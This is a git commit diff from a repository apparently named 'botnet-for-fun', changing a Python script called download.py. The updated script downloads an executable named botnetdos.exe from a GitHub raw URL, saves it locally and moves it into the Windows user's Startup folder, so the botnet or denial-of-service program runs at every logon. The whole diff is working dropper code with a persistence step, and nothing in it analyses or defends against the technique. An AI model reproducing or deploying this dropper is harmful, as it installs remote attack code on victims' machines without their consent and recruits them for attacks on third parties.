380bb9d4e917abf524229a22b7519afabb89df64
SleepyJesper <87932425+AtackYT@users.noreply.github.com>
2022-12-22 14:46:51 +0100

    Add files via upload

--- download.py
+++ download.py
@@ -1,16 +1,21 @@
 import requests
 import shutil
 import os
+import time
 
 name = os.getlogin()
 
-url = 'https://raw.githubusercontent.com/AtackYT/botnet-for-fun/main/botnetdos.py'
+url = 'https://github.com/AtackYT/botnet-for-fun/blob/main/botnetdos.exe?raw=true'
 r = requests.get(url, allow_redirects=True)
 
-open('bndos.py', 'wb').write(r.content)
+open('bndos.exe', 'wb').write(r.content)
 
-source_path = os.path.abspath('bndos.py')
+time.sleep(10)
 
-destination_path = os.path.join('C:', 'Users', name, 'AppData', 'Roaming', 'Microsoft', 'Windows', 'Start Menu', 'Programs', 'Startup')
+source_path = os.path.abspath('bndos.exe')
+
+destination_path = os.path.join('C:\\', 'Users', name, 'AppData', 'Roaming', 'Microsoft', 'Windows', 'Start Menu', 'Programs', 'Startup')
 
 shutil.move(source_path, destination_path)
+
+time.sleep(1)
